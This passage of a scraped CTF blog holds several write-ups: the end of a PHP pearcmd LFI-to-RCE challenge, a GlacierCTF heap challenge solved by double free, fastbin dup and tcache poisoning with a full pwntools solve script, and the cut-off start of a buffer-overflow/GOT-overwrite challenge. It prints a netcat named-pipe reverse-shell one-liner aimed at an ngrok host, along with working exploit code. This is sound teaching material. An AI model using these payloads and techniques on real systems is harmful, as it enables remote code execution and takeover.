gid=82(www-data) groups=82(www-data),82(www-data) uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)/pear/cfg\u0026#34;;s:7:\u0026#34;ext_dir\u0026#34;;s:68:\u0026#34;/\u0026amp;x=/usr/local/lib/php/pearcmd.php\u0026amp;/uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data) uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)/pear/ext\u0026#34;;s:7:\u0026#34;doc_dir\u0026#34;;s:69:\u0026#34;/\u0026amp;x=/usr/local/lib/php/pearcmd.php\u0026amp;/uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data) uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)/pear/docs\u0026#34;;s:8:\u0026#34;test_dir\u0026#34;;s:70:\u0026#34;/\u0026amp;x=/usr/local/lib/php/pearcmd.php\u0026amp;/uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data) uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)/pear/tests\u0026#34;;s:9:\u0026#34;cache_dir\u0026#34;;s:70:\u0026#34;/\u0026amp;x=/usr/local/lib/php/pearcmd.php\u0026amp;/uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data) uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)/pear/cache\u0026#34;;s:12:\u0026#34;download_dir\u0026#34;;s:73:\u0026#34;/\u0026amp;x=/usr/local/lib/php/pearcmd.php\u0026amp;/uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data) uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)/pear/download\u0026#34;;s:8:\u0026#34;temp_dir\u0026#34;;s:69:\u0026#34;/\u0026amp;x=/usr/local/lib/php/pearcmd.php\u0026amp;/uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data) uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)/pear/temp\u0026#34;;s:7:\u0026#34;bin_dir\u0026#34;;s:64:\u0026#34;/\u0026amp;x=/usr/local/lib/php/pearcmd.php\u0026amp;/uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data) uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)/pear\u0026#34;;s:7:\u0026#34;man_dir\u0026#34;;s:68:\u0026#34;/\u0026amp;x=/usr/local/lib/php/pearcmd.php\u0026amp;/uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data) uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)/pear/man\u0026#34;;} Since the output is duplicated many times, I tried to get reverse shell on the remote server with this payload:\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc $NGROK_IP $NGROK_PORT \u0026gt;/tmp/f flag: wgmy{1ca200caa85d3a8dcec7d660e7361f79}\nOn the next part of the post, we will see that we actually gain a shell inside a kubernetes pod and try to poke around with the this challenge deployment.\nReferences # https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#lfi-to-rce-via-php-pearcmd ","date":"17 December 2023","permalink":"/posts/wgmy2023/web/warmup/","section":"My Average Blog","summary":"LFI to RCE via PHP PEARCMD","title":"Warmup"},{"content":"","date":"28 November 2023","permalink":"/tags/cpp/","section":"Tags","summary":"","title":"cpp"},{"content":"","date":"28 November 2023","permalink":"/tags/double-free/","section":"Tags","summary":"","title":"double free"},{"content":"","date":"28 November 2023","permalink":"/tags/fastbin-dup/","section":"Tags","summary":"","title":"fastbin dup"},{"content":" Author: n4nika\nDescription: I love C++. No malloc and free, so I can\u0026rsquo;t mess up my heap management, right?\nAttachment: glacie-rating.tar.gz\nSource Code Analysis # In this program, we are first required to provide a username and a password, then we could interact with the main features of the program with USER level permission:\ncreate a rating delete a rating show a rating scream do admin stuff, which prints out flag.txt (require ADMIN level permission) user.hpp # #ifndef USER_HPP #define USER_HPP #include \u0026lt;string\u0026gt; #include \u0026lt;map\u0026gt; #include \u0026lt;iostream\u0026gt; enum class Perms { ADMIN = 0, USER = 1000, }; class User { private: std::string username_; std::string password_; std::map\u0026lt;size_t, char*\u0026gt; ratings_; Perms user_level_; public: User(std::string username, std::string password, Perms user_level); ~User() = default; User(const User \u0026amp;copy) = delete; std::string getUsername(); Perms getUserLevel(); void insertRating(char *rating); void removeRating(size_t index); void showRatings(); }; #endif Create A Rating # Creating a rating would first allocate a 0x20 sized chunk on the heap, only then followed by rating amount validation, which only allow us to create 3 ratings. Our input is then used to create std::pair value and this pair is then inserted into the std::map\u0026lt;size_t, char*\u0026gt; ratings_\n// main.cpp void writeRating(User *user) { char *buffer = new char[24]; std::cout \u0026lt;\u0026lt; \u0026#34;Give me your rating\u0026#34; \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; \u0026#34;\u0026gt; \u0026#34;; fgets(buffer, 24, stdin); user-\u0026gt;insertRating(buffer); return; } // user.cpp void User::insertRating(char *rating) { if (ratings_.size() \u0026gt;= 3) { std::cout \u0026lt;\u0026lt; \u0026#34;Maximum amount of ratings reached!\u0026#34; \u0026lt;\u0026lt; std::endl; return; } else { ratings_.insert({ratings_.size() + 1, rating}); std::cout \u0026lt;\u0026lt; \u0026#34;Successfully added rating\u0026#34; \u0026lt;\u0026lt; std::endl; return; } } Delete A Rating # Deleting a rating seems to be straight forward, where we are required to choose from the available key inside ratings_. Proper validation is implemented as well to prevent weird interactions. However, there is one problem here. On line 21, the function User::removeRating does not actually delete the std::pair element, but instead only delete the std::pair value. As a result, the size of the std::map stays the same as well.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 // main.cpp void deleteRating(User *user) { size_t index = 0; std::cout \u0026lt;\u0026lt; \u0026#34;Which rating do you want to remove?\u0026#34; \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; \u0026#34;\u0026gt; \u0026#34;; scanf(\u0026#34;%zd\u0026#34;, \u0026amp;index); getchar(); user-\u0026gt;removeRating(index); return; } // user.cpp void User::removeRating(size_t index) { if (ratings_.empty()) { std::cout \u0026lt;\u0026lt; \u0026#34;No ratings to delete\u0026#34; \u0026lt;\u0026lt; std::endl; return; } else if (index \u0026gt;= ratings_.size() + 1 | index \u0026lt; 1) { std::cout \u0026lt;\u0026lt; \u0026#34;Invalid Index\u0026#34; \u0026lt;\u0026lt; std::endl; return; } else { delete ratings_.at(index); // \u0026lt;=== VULNERABILITY!!! std::cout \u0026lt;\u0026lt; \u0026#34;Removed rating \u0026#34; \u0026lt;\u0026lt; index \u0026lt;\u0026lt; std::endl; return; } } Here is a rough visualization of what happen when we delete a rating:\n1: aaaa 2: bbbb 3: cccc Delete `2` --\u0026gt; free bbbbb 1: aaaa 2: ???? 3: cccc Instead of 1: aaaa 3: cccc With this wrong implementation, we are able to leak data from the heap (through show rating), since the key 2 still exists inside ratings_\nThe proper way to delete should be using the erase method.\nShow A Rating # Nothing much here, just a function to display ratings_.\n// main.cpp void showRatings(User *user) { user-\u0026gt;showRatings(); return; } // user.cpp void User::showRatings() { std::cout \u0026lt;\u0026lt; \u0026#34;Your ratings: \u0026#34; \u0026lt;\u0026lt; std::endl; for (auto rating : ratings_) { std::cout \u0026lt;\u0026lt; rating.first \u0026lt;\u0026lt; \u0026#34;: \u0026#34; \u0026lt;\u0026lt; rating.second \u0026lt;\u0026lt; std::endl; } return; } Scream # This function allow us to temporarily create a vector which essentially give us the ability to allocate up to 50 arbitrary size chunks. These chunks are then freed when the vector object goes out of scope. We will get back to this function when developing our exploit later on.\n// main.cpp void scream(User *user) { std::cout \u0026lt;\u0026lt; \u0026#34;Now scream to your hearts content!\u0026#34; \u0026lt;\u0026lt; std::endl; std::string line; std::vector\u0026lt;std::string\u0026gt; lines; while (line != \u0026#34;quit\u0026#34;) { std::getline(std::cin, line); lines.push_back(line); if (lines.size() \u0026gt; 50) { std::cout \u0026lt;\u0026lt; \u0026#34;Thats enough!\u0026#34; \u0026lt;\u0026lt; std::endl; return; } } return; } Do Admin Stuff # This is the function that would give us the flag given that our permission is ADMIN.\n// main.cpp void doAdminStuff(User *user) { if (user-\u0026gt;getUserLevel() != Perms::ADMIN) { std::cout \u0026lt;\u0026lt; \u0026#34;You are not an admin!\u0026#34; \u0026lt;\u0026lt; std::endl; exit(1); } else if (user-\u0026gt;getUserLevel() == Perms::ADMIN) { std::ifstream flag_stream(\u0026#34;./flag.txt\u0026#34;); std::string flag; std::getline(flag_stream, flag); flag_stream.close(); std::cout \u0026lt;\u0026lt; \u0026#34;Verified permissions\u0026#34; \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; \u0026#34;Here is your flag: \u0026#34; \u0026lt;\u0026lt; flag \u0026lt;\u0026lt; std::endl; exit(0); } } Solution # Getting A Heap Leak # From the analysis above, we found out that we could obtain a heap leak by deleting a rating and show the rating.\ncreate(b\u0026#34;a\u0026#34; * 8) show() print(io.recvline()) print(io.recvline()) delete(1) show() print(io.recvline()) print(io.recvline()) \u0026#34;\u0026#34;\u0026#34; b\u0026#39;Your ratings: \\n\u0026#39; b\u0026#39;1: aaaaaaaa\\n\u0026#39; b\u0026#39;Your ratings: \\n\u0026#39; b\u0026#39;1: w\\xa3c`\\x05\\n\u0026#39; \u0026#34;\u0026#34;\u0026#34; Fastbin Dup # What we could do next is to perform double free. However, this does not work due to tcachebins mitigation. We could try to find a way to overwrite the bk field which contain the key to prevent double free but this is not possible. Unlike tcachebins, fastbin does not have the mechanism to detect double free. So our goal now is to free the rating chunk into fastbin and perform double free (also known as fastbin dup).\nTo achieve this, we would need to first fill up the tcachebins with chunks of size 0x20. Recall the scream function which enable us to allocate up to 50 arbitrary size chunks. Furthermore, this function also freed the allocated chunks at the end, which is perfect for us.\ncreate(b\u0026#34;a\u0026#34; * 8) create(b\u0026#34;b\u0026#34; * 8) create(b\u0026#34;c\u0026#34; * 8) delete(3) show() io.recvuntil(b\u0026#34;3: \u0026#34;) heap_leak = u64(io.recvline().strip().ljust(8, b\u0026#34;\\x00\u0026#34;)) log.info(f\u0026#34;{heap_leak=:#x}\u0026#34;) heap = heap_leak \u0026lt;\u0026lt; 12 log.info(f\u0026#34;{heap=:#x}\u0026#34;) user_chunk = heap + 0x370 # fill up tcachebins payload = b\u0026#34;\\n\u0026#34;.join([cyclic(0x10)] * 7 + [b\u0026#34;quit\u0026#34;]) scream(payload) # fastbin dup delete(1) delete(2) delete(1) # \u0026lt;=== DOUBLE FREE!!! Before scream\n----------------------------------- Tcachebins for arena \u0026#39;main_arena\u0026#39; ----------------------------------- tcachebins[idx=0, size=0x20, @0x555555563090] count=1 -\u0026gt; Chunk(addr=0x555555575530, size=0x20, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0) tcachebins[idx=1, size=0x30, @0x555555563098] count=1 -\u0026gt; Chunk(addr=0x5555555752a0, size=0x30, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0) tcachebins[idx=3, size=0x50, @0x5555555630a8] count=2 -\u0026gt; Chunk(addr=0x5555555752d0, size=0x50, flags=PREV_INUSE, fd=0x555000020645, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x555555575320, size=0x50, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0) [+] Found 4 chunks in tcache. ------------------------------------ Fastbins for arena \u0026#39;main_arena\u0026#39; ------------------------------------ [+] Found 0 chunks in fastbin. After scream\n----------------------------------- Tcachebins for arena \u0026#39;main_arena\u0026#39; ----------------------------------- tcachebins[idx=0, size=0x20, @0x555555563090] count=7 -\u0026gt; Chunk(addr=0x555555575800, size=0x20, flags=PREV_INUSE, fd=0x555000020285, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x5555555757e0, size=0x20, flags=PREV_INUSE, fd=0x5550000202a5, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x5555555757c0, size=0x20, flags=PREV_INUSE, fd=0x5550000203d5, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x555555575690, size=0x20, flags=PREV_INUSE, fd=0x5550000203f5, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x555555575670, size=0x20, flags=PREV_INUSE, fd=0x5550000200a5, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x5555555755c0, size=0x20, flags=PREV_INUSE, fd=0x555000020035, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x555555575530, size=0x20, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0) tcachebins[idx=1, size=0x30, @0x555555563098] count=2 -\u0026gt; Chunk(addr=0x5555555752a0, size=0x30, flags=PREV_INUSE, fd=0x5550000200d5, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x555555575590, size=0x30, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0) tcachebins[idx=3, size=0x50, @0x5555555630a8] count=2 -\u0026gt; Chunk(addr=0x5555555752d0, size=0x50, flags=PREV_INUSE, fd=0x555000020645, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x555555575320, size=0x50, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0) tcachebins[idx=7, size=0x90, @0x5555555630c8] count=1 -\u0026gt; Chunk(addr=0x5555555755e0, size=0x90, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0) tcachebins[idx=15, size=0x110, @0x555555563108] count=1 -\u0026gt; Chunk(addr=0x5555555756b0, size=0x110, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0) [+] Found 13 chunks in tcache. ------------------------------------ Fastbins for arena \u0026#39;main_arena\u0026#39; ------------------------------------ [+] Found 0 chunks in fastbin. Now, when we delete rating 1 and 2, both would go to fastbin.\n----------------------------------- Tcachebins for arena \u0026#39;main_arena\u0026#39; ----------------------------------- tcachebins[idx=0, size=0x20, @0x555555563090] count=7 -\u0026gt; Chunk(addr=0x555555575800, size=0x20, flags=PREV_INUSE, fd=0x555000020285, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x5555555757e0, size=0x20, flags=PREV_INUSE, fd=0x5550000202a5, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x5555555757c0, size=0x20, flags=PREV_INUSE, fd=0x5550000203d5, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x555555575690, size=0x20, flags=PREV_INUSE, fd=0x5550000203f5, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x555555575670, size=0x20, flags=PREV_INUSE, fd=0x5550000200a5, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x5555555755c0, size=0x20, flags=PREV_INUSE, fd=0x555000020035, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x555555575530, size=0x20, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0) tcachebins[idx=1, size=0x30, @0x555555563098] count=2 -\u0026gt; Chunk(addr=0x5555555752a0, size=0x30, flags=PREV_INUSE, fd=0x5550000200d5, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x555555575590, size=0x30, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0) tcachebins[idx=3, size=0x50, @0x5555555630a8] count=2 -\u0026gt; Chunk(addr=0x5555555752d0, size=0x50, flags=PREV_INUSE, fd=0x555000020645, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x555555575320, size=0x50, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0) tcachebins[idx=7, size=0x90, @0x5555555630c8] count=1 -\u0026gt; Chunk(addr=0x5555555755e0, size=0x90, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0) tcachebins[idx=15, size=0x110, @0x555555563108] count=1 -\u0026gt; Chunk(addr=0x5555555756b0, size=0x110, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0) [+] Found 13 chunks in tcache. ------------------------------------ Fastbins for arena \u0026#39;main_arena\u0026#39; ------------------------------------ fastbins[idx=0, size=0x20, @0x7ffff7c17ad0] -\u0026gt; Chunk(addr=0x555555575510, size=0x20, flags=PREV_INUSE, fd=0x555000020185, bk=0x00000000000a) -\u0026gt; Chunk(addr=0x5555555754f0, size=0x20, flags=PREV_INUSE, fd=0x000555555575, bk=0x00000000000a) [+] Found 2 chunks in fastbin. Next, we trigger the double free by deleting rating 1.\n------------------------------------ Fastbins for arena \u0026#39;main_arena\u0026#39; ------------------------------------ fastbins[idx=0, size=0x20, @0x7ffff7c17ad0] -\u0026gt; Chunk(addr=0x5555555754f0, size=0x20, flags=PREV_INUSE, fd=0x555000020065, bk=0x00000000000a) -\u0026gt; Chunk(addr=0x555555575510, size=0x20, flags=PREV_INUSE, fd=0x555000020185, bk=0x00000000000a) -\u0026gt; Chunk(addr=0x5555555754f0, size=0x20, flags=PREV_INUSE, fd=0x555000020065, bk=0x00000000000a) -\u0026gt; 0x555555575500 [loop detected] [+] Found 2 chunks in fastbin. Tcache Poisoning # Now, when we request a 0x20 size chunk, it would first go through tcachebins until it\u0026rsquo;s empty. When we empty out the tcachebins, the next allocation request would go to fastbin and the rest of the bins would be dumped into tcachebins. But how do we empty out the tcachebins? Using scream is not ideal as the chunks would get freed again. The answer is to simply create a rating. This is because the allocation is done before the rating count validation check.\nBefore allocation request\n----------------------------------- Tcachebins for arena \u0026#39;main_arena\u0026#39; ----------------------------------- tcachebins[idx=1, size=0x30, @0x555555563098] count=2 -\u0026gt; Chunk(addr=0x5555555752a0, size=0x30, flags=PREV_INUSE, fd=0x5550000200d5, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x555555575590, size=0x30, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0) tcachebins[idx=3, size=0x50, @0x5555555630a8] count=2 -\u0026gt; Chunk(addr=0x5555555752d0, size=0x50, flags=PREV_INUSE, fd=0x555000020645, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x555555575320, size=0x50, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0) tcachebins[idx=7, size=0x90, @0x5555555630c8] count=1 -\u0026gt; Chunk(addr=0x5555555755e0, size=0x90, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0) tcachebins[idx=15, size=0x110, @0x555555563108] count=1 -\u0026gt; Chunk(addr=0x5555555756b0, size=0x110, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0) [+] Found 6 chunks in tcache. ------------------------------------ Fastbins for arena \u0026#39;main_arena\u0026#39; ------------------------------------ fastbins[idx=0, size=0x20, @0x7ffff7c17ad0] -\u0026gt; Chunk(addr=0x5555555754f0, size=0x20, flags=PREV_INUSE, fd=0x555000020065, bk=0x00000000000a) -\u0026gt; Chunk(addr=0x555555575510, size=0x20, flags=PREV_INUSE, fd=0x555000020185, bk=0x00000000000a) -\u0026gt; Chunk(addr=0x5555555754f0, size=0x20, flags=PREV_INUSE, fd=0x555000020065, bk=0x00000000000a) -\u0026gt; 0x555555575500 [loop detected] [+] Found 2 chunks in fastbin. After allocation request: 0x560c41f0d4f0 is allocated, which is the first free chunk in fastbin, and the remaining chunks are dumped into tcachebins.\n----------------------------------- Tcachebins for arena \u0026#39;main_arena\u0026#39; ----------------------------------- tcachebins[idx=0, size=0x20, @0x560c41efb090] count=3 -\u0026gt; Chunk(addr=0x560c41f0d510, size=0x20, flags=PREV_INUSE, fd=0x56092134ca0d, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x560c41f0d4f0, size=0x20, flags=PREV_INUSE, fd=0x56092134ca2d, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x560c41f0d510, size=0x20, flags=PREV_INUSE, fd=0x56092134ca0d, bk=0x6ee603c65e3f27c0) -\u0026gt; 0x560c41f0d520 [loop detected]two chunk tcachebins[idx=1, size=0x30, @0x560c41efb098] count=2 -\u0026gt; Chunk(addr=0x560c41f0d2a0, size=0x30, flags=PREV_INUSE, fd=0x56092134caad, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x560c41f0d590, size=0x30, flags=PREV_INUSE, fd=0x000560c41f0d, bk=0x6ee603c65e3f27c0) tcachebins[idx=3, size=0x50, @0x560c41efb0a8] count=2 -\u0026gt; Chunk(addr=0x560c41f0d2d0, size=0x50, flags=PREV_INUSE, fd=0x56092134cc3d, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x560c41f0d320, size=0x50, flags=PREV_INUSE, fd=0x000560c41f0d, bk=0x6ee603c65e3f27c0) tcachebins[idx=7, size=0x90, @0x560c41efb0c8] count=1 -\u0026gt; Chunk(addr=0x560c41f0d5e0, size=0x90, flags=PREV_INUSE, fd=0x000560c41f0d, bk=0x6ee603c65e3f27c0) tcachebins[idx=15, size=0x110, @0x560c41efb108] count=1 -\u0026gt; Chunk(addr=0x560c41f0d6b0, size=0x110, flags=PREV_INUSE, fd=0x000560c41f0d, bk=0x6ee603c65e3f27c0) [+] Found 8 chunks in tcache. ------------------------------------ Fastbins for arena \u0026#39;main_arena\u0026#39; ------------------------------------ [+] Found 0 chunks in fastbin. gef\u0026gt; p $rax - 0x10 $1 = 0x560c41f0d4f0 Now that we received a chunk at 0x560c41f0d4f0, while this chunk exists on tcachebins, we could perform tcache poisoning to allocate a chunk where we could overwrite our user permission level.\nFinal Solve Script # #!/usr/bin/env python3 # type: ignore # flake8: noqa from pwn import * elf = context.binary = ELF(\u0026#34;./app\u0026#34;, checksec=False) def start(argv=[], *a, **kw): nc = \u0026#34;nc chall.glacierctf.com 13373\u0026#34; nc = nc.split() host = args.HOST or nc[1] port = int(args.PORT or nc[2]) if args.REMOTE: return remote(host, port) else: args_ = [elf.path] + argv if args.NA: args_ = [\u0026#34;setarch\u0026#34;, \u0026#34;-R\u0026#34;] + args_ return process(args_, env=env, *a, **kw) def create(rating: bytes): io.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;1\u0026#34;) io.sendlineafter(b\u0026#34;rating\\n\u0026gt; \u0026#34;, rating) def delete(idx): io.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;2\u0026#34;) io.sendlineafter(b\u0026#34;remove?\\n\u0026gt; \u0026#34;, str(idx).encode()) def show(): io.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;3\u0026#34;) def scream(aaa: bytes): io.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;4\u0026#34;) io.sendlineafter(b\u0026#34;content!\\n\u0026#34;, aaa) def admin(): io.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;5\u0026#34;) def reveal(ptr): mask = 0xfff \u0026lt;\u0026lt; 36 while mask: ptr ^= (ptr \u0026amp; mask) \u0026gt;\u0026gt; 12 mask \u0026gt;\u0026gt;= 12 return ptr def mangle(pos, ptr): return (pos \u0026gt;\u0026gt; 12) ^ ptr env = {} io = start() io.sendlineafter(b\u0026#34;username: \u0026#34;, cyclic(0x30)) io.sendlineafter(b\u0026#34;password: \u0026#34;, cyclic(0x30)) create(b\u0026#34;a\u0026#34; * 8) create(b\u0026#34;b\u0026#34; * 8) create(b\u0026#34;c\u0026#34; * 8) delete(3) show() io.recvuntil(b\u0026#34;3: \u0026#34;) heap_leak = u64(io.recvline().strip().ljust(8, b\u0026#34;\\x00\u0026#34;)) log.info(f\u0026#34;{heap_leak=:#x}\u0026#34;) heap = heap_leak \u0026lt;\u0026lt; 12 log.info(f\u0026#34;{heap=:#x}\u0026#34;) user_chunk = heap + 0x370 # Fill up tcachebins payload = b\u0026#34;\\n\u0026#34;.join([cyclic(0x10)] * 7 + [b\u0026#34;quit\u0026#34;]) scream(payload) # fastbin dup delete(1) delete(2) delete(1) # Empty out tcachebins create(b\u0026#34;f\u0026#34; * 8) create(b\u0026#34;f\u0026#34; * 8) create(b\u0026#34;f\u0026#34; * 8) create(b\u0026#34;f\u0026#34; * 8) create(b\u0026#34;f\u0026#34; * 8) create(b\u0026#34;f\u0026#34; * 8) create(b\u0026#34;f\u0026#34; * 8) # After tcachebins is empty, the fastbins are dumped into tcachebins # which enable us to do tcache poisoning with the fastbin dup earlier fd = mangle(heap + 0x4f0, user_chunk + 0x80) # perms field create(p64(fd)) create(b\u0026#34;f\u0026#34; * 8) create(b\u0026#34;f\u0026#34; * 8) create(p64(0) + p64(0x41)) admin() io.interactive() ‚ûú ./solve.py REMOTE [+] Opening connection to chall.glacierctf.com on port 13373: Done [*] heap_leak=0x557c4b598 [*] heap=0x557c4b598000 [*] Switching to interactive mode Verified permissions Here is your flag: gctf{I_th0ght_1_c0uld_n0t_m3ss_4nyth1ng_up} [*] Got EOF while reading in interactive $ [*] Interrupted [*] Closed connection to chall.glacierctf.com port 13373 ","date":"28 November 2023","permalink":"/posts/glacierctf-2023/pwn/glacier-rating/","section":"My Average Blog","summary":"Double free into tcache poisoning","title":"Glacier Rating"},{"content":"","date":"28 November 2023","permalink":"/categories/glacierctf-2023/","section":"Categories","summary":"","title":"GlacierCTF 2023"},{"content":"","date":"28 November 2023","permalink":"/tags/heap/","section":"Tags","summary":"","title":"heap"},{"content":"","date":"28 November 2023","permalink":"/categories/pwn/","section":"Categories","summary":"","title":"pwn"},{"content":"","date":"28 November 2023","permalink":"/tags/tcache-poisoning/","section":"Tags","summary":"","title":"tcache poisoning"},{"content":"","date":"16 November 2023","permalink":"/tags/bof/","section":"Tags","summary":"","title":"bof"},{"content":" Author: ptr-yudai\nDescription: buffer overflow with win function\nAttachment: bofww.tar.gz\nSource Code # #include \u0026lt;iostream\u0026gt; void win() { std::system(\u0026#34;/bin/sh\u0026#34;); } void input_person(int\u0026amp; age, std::string\u0026amp; name) { int _age; char _name[0x100]; std::cout \u0026lt;\u0026lt; \u0026#34;What is your first name? \u0026#34;; std::cin \u0026gt;\u0026gt; _name; std::cout \u0026lt;\u0026lt; \u0026#34;How old are you? \u0026#34;; std::cin \u0026gt;\u0026gt; _age; name = _name; age = _age; } int main() { int age; std::string name; input_person(age, name); std::cout \u0026lt;\u0026lt; \u0026#34;Information:\u0026#34; \u0026lt;\u0026lt; std::endl \u0026lt;\u0026lt; \u0026#34;Age: \u0026#34; \u0026lt;\u0026lt; age \u0026lt;\u0026lt; std::endl \u0026lt;\u0026lt; \u0026#34;Name: \u0026#34; \u0026lt;\u0026lt; name \u0026lt;\u0026lt; std::endl; return 0; } __attribute__((constructor)) void setup(void) { std::setbuf(stdin, NULL); std::setbuf(stdout, NULL); } ‚ûú checksec --file ./bofww Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) Initial Analysis # There is an obvious buffer overflow on input_person(), specifically the _name variable. However, the program is compiled with stack protector and we might need to leak the stack cookie for us to smash the stack. Unfortunately, I could not find any way to leak the cookie and gain another round of buffer overflow. Luckily, the program global offset table (GOT) entries are overwritable. Moreover, there is a win function which would pop us a shell; hence, the plan is to overwrite __stack_chk_fail GOT entry to be the address of win() function.\nBut, how do we overwrite the GOT, you may ask? Well, in short, we overwrite the std::string structure which contains pointer to a memory address in which the actual string content lives. Guess, this is a good excuse to dive into libstdc++6 (cxx11) std::string internals to better understand how our exploit works. Then, we would walkthrough the operator= function to better craft our exploit. If you are just here for the final solve script, you can skip to this section.\nstd::string Brief Internals # Let\u0026rsquo;s try to play with the program through GDB. First, set a breakpoint at input_person+164, which is the just before name = _name line of code is executed. Next, run the program and input any short name, in this example, the input would be aaaabaaa for _name, and any number for _age.\ngef\u0026gt; break *input_person+164 gef\u0026gt; run gef\u0026gt; info reg rdi rdi 0x7fffffffcde0 0x7fffffffcde0 gef\u0026gt; ni gef\u0026gt; tele 0x7fffffffcde0 0x7fffffffcde0|+0x0000|+000: 0x00007fffffffcdf0 -\u0026gt; \u0026#39;aaaabaaa\u0026#39; \u0026lt;- $rax 0x7fffffffcde8|+0x0008|+001: 0x0000000000000008 0x7fffffffcdf0|+0x0010|+002: \u0026#39;aaaabaaa\u0026#39; \u0026lt;- $rdi 0x7fffffffcdf8|+0x0018|+003: 0x0000000000000000 0x7fffffffce00|+0x0020|+004: 0x0000000000000000 0x7fffffffce08|+0x0028|+005: 0xa7306dc9e85ed800 \u0026lt;- canary We could try to supply another input, for example aaaabaaacaaaa, and inspect the memory.\n0x7fffffffcde0|+0x0000|+000: 0x00007fffffffcdf0 -\u0026gt; \u0026#39;aaaabaaacaaa\u0026#39; \u0026lt;- $rax 0x7fffffffcde8|+0x0008|+001: 0x000000000000000c (\u0026#39;\\x0c\u0026#39;?) 0x7fffffffcdf0|+0x0010|+002: \u0026#39;aaaabaaacaaa\u0026#39; \u0026lt;- $rdi 0x7fffffffcdf8|+0x0018|+003: 0x0000000061616163 (\u0026#39;caaa\u0026#39;?) 0x7fffffffce00|+0x0020|+004: 0x0000000000000000 0x7fffffffce08|+0x0028|+005: 0xdea7b9a5dde5b200 \u0026lt;- canary We could see from the two examples how std::string is represented on the stack and sort of guess that:\noffset data 0x00 pointer to the string content 0x08 length of the string content 0x10 the actual string content Looks like the structure could hold up to either 0x10 or 0x18 bytes of characters (including the NULL termination byte) on the stack. Let\u0026rsquo;s try to provide 0x10 bytes of input and see how it reacts.\n0x7fffffffcde0|+0x0000|+000: 0x00000000004172b0 -\u0026gt; \u0026#39;aaaaaaaabaaaaaaa\u0026#39; \u0026lt;- $rax 0x7fffffffcde8|+0x0008|+001: 0x0000000000000010 0x7fffffffcdf0|+0x0010|+002: 